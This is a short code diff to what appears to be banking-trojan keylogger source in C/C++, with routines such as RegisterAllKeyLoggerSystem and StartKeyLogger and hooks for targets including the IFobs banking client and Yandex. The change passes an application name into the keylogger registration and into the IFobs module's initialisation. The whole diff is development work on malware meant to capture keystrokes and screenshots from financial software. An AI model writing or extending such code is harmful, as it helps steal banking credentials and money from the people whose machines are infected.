@@ -151,7 +151,7 @@ void FakturaInitialize(LPVOID Sender) {
 // ---------------------------------------------------------------------------
 
 
-void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
+void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp, const char* appName)
 {
 	// Функция регистрирует заранее известные системы кейлогера
 
@@ -208,7 +208,7 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 	#endif
 
 	#ifdef IFobsH
-		IFobs::Init();
+		IFobs::Init(appName);
 	#endif
 
 	#ifdef YandexH
@@ -235,7 +235,7 @@ void StartKeyLogger(PCHAR AppName)
 	Data.SSWidth = 40;
 	Data.SSHeight = 40;
 
-	RegisterAllKeyLoggerSystem(&Data, P->ProcessNameHash);
+	RegisterAllKeyLoggerSystem(&Data, P->ProcessNameHash, AppName);
 
 
 
